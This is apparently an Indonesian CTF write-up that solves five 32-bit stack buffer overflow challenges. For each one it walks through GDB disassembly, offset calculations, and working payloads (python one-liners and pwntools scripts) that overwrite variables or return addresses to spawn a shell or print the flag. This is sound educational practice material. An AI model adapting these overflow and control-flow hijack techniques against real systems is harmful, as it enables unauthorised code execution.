# Write Up Binary Exploit Asgama CTF

## Buffer1 [50 pts]

Diberikan file ELF 32-bit not stripped dan service ```nc asgama.web.id 40203```.

```
$ file buf1 
buf1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66a2a0cfb02b03a6abf1e65146da2739e8b17bdd, not stripped
```

Langsung saja buka di GDB dan liat hasil dissasemble fungsi ```main```.

Fungsi ```main```:
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048537 <+0>:  lea    ecx,[esp+0x4]
   0x0804853b <+4>:  and    esp,0xfffffff0
   0x0804853e <+7>:  push   DWORD PTR [ecx-0x4]
   0x08048541 <+10>: push   ebp
   0x08048542 <+11>: mov    ebp,esp
   0x08048544 <+13>: push   ecx
   0x08048545 <+14>: sub    esp,0x94
   0x0804854b <+20>: call   0x8048506 <init>
   0x08048550 <+25>: mov    DWORD PTR [ebp-0xc],0x0
   0x08048557 <+32>: sub    esp,0xc
   0x0804855a <+35>: lea    eax,[ebp-0x8c]
   0x08048560 <+41>: push   eax
   0x08048561 <+42>: call   0x8048390 <gets@plt>
   0x08048566 <+47>: add    esp,0x10
   0x08048569 <+50>: cmp    DWORD PTR [ebp-0xc],0x13377331
   0x08048570 <+57>: jne    0x8048584 <main+77>
   0x08048572 <+59>: sub    esp,0xc
   0x08048575 <+62>: push   0x8048630
   0x0804857a <+67>: call   0x80483b0 <system@plt>
   0x0804857f <+72>: add    esp,0x10
   0x08048582 <+75>: jmp    0x8048594 <main+93>
   0x08048584 <+77>: sub    esp,0xc
   0x08048587 <+80>: push   0x804863b
   0x0804858c <+85>: call   0x80483a0 <puts@plt>
   0x08048591 <+90>: add    esp,0x10
   0x08048594 <+93>: mov    eax,0x0
   0x08048599 <+98>: mov    ecx,DWORD PTR [ebp-0x4]
   0x0804859c <+101>:   leave  
   0x0804859d <+102>:   lea    esp,[ecx-0x4]
   0x080485a0 <+105>:   ret    
End of assembler dump.
```

Program ini menggunakan ```gets``` untuk mengambil inputan yang diberi ukuran sebesar ```0x8c```. Tujuan kita disini adalah memanggil ```system``` tapi ada syarat yang harus dipenuhi dulu yaitu pada alamat ```ebp-0xc``` harus bernilai ```0x13377331```.
Kalkulasi : ```0x8c - 0xc = 0x80 (128 dalam desimal) dan little endian dari 0x13377331 = \x31\x73\x37\x13```
Langsung saja wkwk..

Command : ```python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203```

Result : 
```
$ python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203
GamaCTF{BufF3rR__0vErf10W__EZ}
```
Flag : ```GamaCTF{BufF3rR__0vErf10W__EZ}```

## Buffer2 [75 pts]

Diberikan File ELF 32-bit not stripped dan service ```nc asgama.web.id 40202```

Command : ```file buf2```
```
$ file buf2 
buf2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=422a2c2391911b03f182ed6a8a2b65ca200f276c, not stripped
```
Oke, langsung lihat disassemble fungsi ```main``` dengan GDB+Peda.

Fungsi ```main```:
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804855d <+0>:	lea    ecx,[esp+0x4]
   0x08048561 <+4>:	and    esp,0xfffffff0
   0x08048564 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048567 <+10>:	push   ebp
   0x08048568 <+11>:	mov    ebp,esp
   0x0804856a <+13>:	push   ecx
   0x0804856b <+14>:	sub    esp,0x4
   0x0804856e <+17>:	call   0x8048545 <hah>
   0x08048573 <+22>:	sub    esp,0xc
   0x08048576 <+25>:	push   0x8048623
   0x0804857b <+30>:	call   0x80483a0 <puts@plt>
   0x08048580 <+35>:	add    esp,0x10
   0x08048583 <+38>:	mov    eax,0x0
   0x08048588 <+43>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804858b <+46>:	leave  
   0x0804858c <+47>:	lea    esp,[ecx-0x4]
   0x0804858f <+50>:	ret    
End of assembler dump. 
```
Ternyata fungsi ```main``` memanggil fungsi ```hah``` yang menggunakan ```gets``` untuk mengambil inputan, sedangkan ```gets``` sendiri memiliki vulnerable yang sangat berbahaya, sehingga kita bisa mengubah return address ke fungsi tujuan kita untuk mendapat flag.

Fungsi ```hah```:
```
gdb-peda$ pdisas hah
Dump of assembler code for function hah:
   0x08048545 <+0>:	push   ebp
   0x08048546 <+1>:	mov    ebp,esp
   0x08048548 <+3>:	sub    esp,0x48
   0x0804854b <+6>:	sub    esp,0xc
   0x0804854e <+9>:	lea    eax,[ebp-0x48]
   0x08048551 <+12>:	push   eax
   0x08048552 <+13>:	call   0x8048390 <gets@plt>
   0x08048557 <+18>:	add    esp,0x10
   0x0804855a <+21>:	nop
   0x0804855b <+22>:	leave  
   0x0804855c <+23>:	ret    
End of assembler dump.
```

Variable ```gets``` Hanya diberi size sebesar 0x48 atau 72 dalam desimal. Sehingga jarak antara offset sampai return address adalah ```72 + 4 = 76```. 4 disitu adalah jumlah 1 register 32 bit.
Oke, karena kita sudah dapat offset nya sekarang cari address tujuan kita yaitu fungsi ```debug```.
Untuk mencari address ```debug```, kita bisa gunakan objdump.

Command : ```objdump -D buf2 | grep debug```
```
$ objdump -D buf2 | grep debug
0804851c <debug>:
```
Address debug : ```0x0804851c``` tapi harus dijadiin little endian dulu. Jadi : ```\x1c\x85\x04\x08``` atau bisa pake fungsi yang ada di pwntools.
Mantap, langsung aja buat solver nya. (Pake pwntools biar rapi wkwk)

```solver.py```
```python
from pwn import *

#r = process("./buf2")
r = remote("asgama.web.id", 40202)
offset = 76
debug = p32(0x0804851c)
payload = "A"*offset + debug

r.send(payload)
r.interactive()
```
Result :
```
$ python solver.py 
[+] Opening connection to asgama.web.id on port 40202: Done
[*] Switching to interactive mode
$ 
$ ls
buf2
flag
$ cat flag
GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}
$
[*] Closed connection to asgama.web.id port 40202
```

Flag : ```GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}```

Note : Untuk melihat fungsi bisa dengan GDB dengan command ```info functions``` atau ```i func```.

# EZ 1 [100 pts]

Diberikan file ELF 32-bit not stripped bernama ```hoho``` dan service ```nc asgama.web.id 40210```
```
$ file hoho
hoho: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=91cf29963d62f9f85d561bb273ed4d7a54b5037b, not stripped
```

Hasil dissasembly fungsi ```main``` dengan gdb+peda:

```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804851c <+0>:  lea    ecx,[esp+0x4]
   0x08048520 <+4>:  and    esp,0xfffffff0
   0x08048523 <+7>:  push   DWORD PTR [ecx-0x4]
   0x08048526 <+10>: push   ebp
   0x08048527 <+11>: mov    ebp,esp
   0x08048529 <+13>: push   ecx
   0x0804852a <+14>: sub    esp,0x94
   0x08048530 <+20>: call   0x80484eb <init>
   0x08048535 <+25>: mov    DWORD PTR [ebp-0xc],0x0
   0x0804853c <+32>: mov    DWORD PTR [ebp-0x10],0x64
   0x08048543 <+39>: sub    esp,0xc
   0x08048546 <+42>: lea    eax,[ebp-0x90]
   0x0804854c <+48>: push   eax
   0x0804854d <+49>: call   0x8048390 <gets@plt>
   0x08048552 <+54>: add    esp,0x10
   0x08048555 <+57>: cmp    DWORD PTR [ebp-0xc],0x13377331
   0x0804855c <+64>: jne    0x8048576 <main+90>
   0x0804855e <+66>: cmp    DWORD PTR [ebp-0x10],0x0
   0x08048562 <+70>: jne    0x8048576 <main+90>
   0x08048564 <+72>: sub    esp,0xc
   0x08048567 <+75>: push   0x8048620
   0x0804856c <+80>: call   0x80483b0 <system@plt>
   0x08048571 <+85>: add    esp,0x10
   0x08048574 <+88>: jmp    0x8048586 <main+106>
   0x08048576 <+90>: sub    esp,0xc
   0x08048579 <+93>: push   0x804862b
   0x0804857e <+98>: call   0x80483a0 <puts@plt>
   0x08048583 <+103>:   add    esp,0x10
   0x08048586 <+106>:   mov    eax,0x0
   0x0804858b <+111>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x0804858e <+114>:   leave  
   0x0804858f <+115>:   lea    esp,[ecx-0x4]
   0x08048592 <+118>:   ret    
End of assembler dump.
```

Hampir sama dengan soal ```buffer1```. Binary ini menggunakan ```gets``` untuk mengambil inputan yang diberi ukuran sebesar ```0x90```.
Untuk mencapai ```system``` kita harus memenuhi beberapa syarat terlebih dahulu yaitu:
   
   1. ebp-0xc harus bernilai 0x13377331
   2. ebp-0x10 harus bernilai 0x0

Langsung saja susun payload hehe.

Command : ```python -c 'print "\x00"*132 + "\x31\x73\x37\x13"' | nc asgama.web.id 40210```

Result : 
```
$ python -c 'print "\x00"*132 + "\x31\x73\x37\x13"' | nc asgama.web.id 40210
GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}
```

Flag : ```GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}```


# EZ 2 [150 pts]

Diberikan file ELF-32 bit not stripped bernama ```hoho``` dan service  ```nc asgama.web.id 40209```
```
$ file hehe
hehe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=91febecb162e2e4c737a82cd97f7f38040c28e55, not stripped
```

Langsung lihat fungsi ```main``` dengan gdb.
```
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048566 <+0>:  lea    ecx,[esp+0x4]
   0x0804856a <+4>:  and    esp,0xfffffff0
   0x0804856d <+7>:  push   DWORD PTR [ecx-0x4]
   0x08048570 <+10>: push   ebp
   0x08048571 <+11>: mov    ebp,esp
   0x08048573 <+13>: push   ecx
   0x08048574 <+14>: sub    esp,0x4
   0x08048577 <+17>: call   0x804854e <hah>
   0x0804857c <+22>: sub    esp,0xc
   0x0804857f <+25>: push   0x8048633
   0x08048584 <+30>: call   0x80483a0 <puts@plt>
   0x08048589 <+35>: add    esp,0x10
   0x0804858c <+38>: mov    eax,0x0
   0x08048591 <+43>: mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+46>: leave  
   0x08048595 <+47>: lea    esp,[ecx-0x4]
   0x08048598 <+50>: ret    
End of assembler dump.
```

Tidak ada apa - apa gan, tapi fungsi ```main``` memanggil fungsi ```hah```.

Fungsi ```hah```:
```
gdb-peda$ pdisas hah
Dump of assembler code for function hah:
   0x0804854e <+0>:  push   ebp
   0x0804854f <+1>:  mov    ebp,esp
   0x08048551 <+3>:  sub    esp,0x48
   0x08048554 <+6>:  sub    esp,0xc
   0x08048557 <+9>:  lea    eax,[ebp-0x48]
   0x0804855a <+12>: push   eax
   0x0804855b <+13>: call   0x8048390 <gets@plt>
   0x08048560 <+18>: add    esp,0x10
   0x08048563 <+21>: nop
   0x08048564 <+22>: leave  
   0x08048565 <+23>: ret    
End of assembler dump.
```

Fungsi ```debug```:
```
gdb-peda$ pdisas debug
Dump of assembler code for function debug:
   0x0804851c <+0>:  push   ebp
   0x0804851d <+1>:  mov    ebp,esp
   0x0804851f <+3>:  sub    esp,0x8
   0x08048522 <+6>:  cmp    DWORD PTR [ebp+0x8],0xaabbccdd
   0x08048529 <+13>: jne    0x804854b <debug+47>
   0x0804852b <+15>: sub    esp,0xc
   0x0804852e <+18>: push   0x8048620
   0x08048533 <+23>: call   0x80483a0 <puts@plt>
   0x08048538 <+28>: add    esp,0x10
   0x0804853b <+31>: sub    esp,0xc
   0x0804853e <+34>: push   0x804862b
   0x08048543 <+39>: call   0x80483b0 <system@plt>
   0x08048548 <+44>: add    esp,0x10
   0x0804854b <+47>: nop
   0x0804854c <+48>: leave  
   0x0804854d <+49>: ret    
End of assembler dump.
```

Solusi: ```Sampah + return address + argumen yang harus dipenuhi di address tujuan```

   1. Ukuran variable ```gets``` adalah 0x48 (72 dalam desimal) + 4 untuk sampai ke return address
   2. Address yang kita tuju adalah ```debug``` yang memanggil ```system("/bin/sh")```
   3. Dimana pada fungsi ```debug``` ebp+0x8 harus bernilai ```0xaabbccdd```.

Biar rapi kita bikin solvernya pake pwntools ok?

```solver.py```
```
from pwn import *

r = remote("asgama.web.id", 40209)

offset = 72 + 4 # 4 adalah besar 1 register 32 bit
debug = p32(0x0804851c) # address debug
arg_debug = p32(0xaabbccdd) # arg ebp+0x8 pada debug 

payload = "A"*offset
payload += debug # return ke address debug
payload += "AAAA"# karena panjang arg_debug adalah 4 maka, kita isi sampah dgn ukuran 4 bytes sehingga ebp+0x8 terpenuhi
# ebp+0x4 | \x41\x41\x41\x41
# ebp+0x8 | \xdd\xcc\xbb\xaa
payload += arg_debug

r.sendline(payload)
r.interactive()
```

Jalankan script dan flag didapatkan:
```
$ python solver.py 
[+] Opening connection to asgama.web.id on port 40209: Done
[*] Switching to interactive mode
Debug Mode
$ ls
flag
hehe
$ cat flag
GamaCTF{R0P_r0P_FTW}
$ 
[*] Interrupted
[*] Closed connection to asgama.web.id port 40209
```

Flag: ```GamaCTF{R0P_r0P_FTW}```

# Buffow [200 pts]

Diberikan file ELF 32-bit not stripped yang hanya meminta inputan tapi tidak mencetak output dan service ```nc asgama.web.id 40211```
```
$ file buffow
buffow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=10ddb3cec335906e1fc641fce780bffc73fcb09a, not stripped
```

Di program ini mempunyai banyak fungsi tapi yang paling penting adalah fungsi ```main``` dan ```flag```.
Saya coba membuat inputan dengan ```pattern``` yang ada di gdb.

```
gdb-peda$ pattern create 300 exp
Writing pattern of 300 chars to filename "exp"
gdb-peda$ b *0x08049290
Breakpoint 2 at 0x8049290
gdb-peda$ r < exp 
Starting program: /home/abdullahnz/AsgamaCTF/WriteUp/buffow < exp
...
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
```

Terlihat pada offset 52 ```eip``` ter-overwrite dan kita bisa merubah address ke address tujuan kita yaitu fungsi ```flag``` yang akan mencetak flag yang kita cari.

Kita cari address ```flag``` dengan ```objdump```

Command : ```objdump -D ./buffow | grep flag```

```
$ objdump -D ./buffow | grep flag
080491c2 <flag>:
```

Langsung saja kita buat payload ```sampah + address_flag + sampah```.

Payload : ```python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "A"*200'```

Command : ```$ python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "A"*200' | nc asgama.web.id 40211```

Result : 
```
$ python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "A"*200' | nc asgama.web.id 40211
GamaCTF{Ini_Bukan_Flagnya}
```

Flag : ```GamaCTF{Ini_Bukan_Flagnya}```
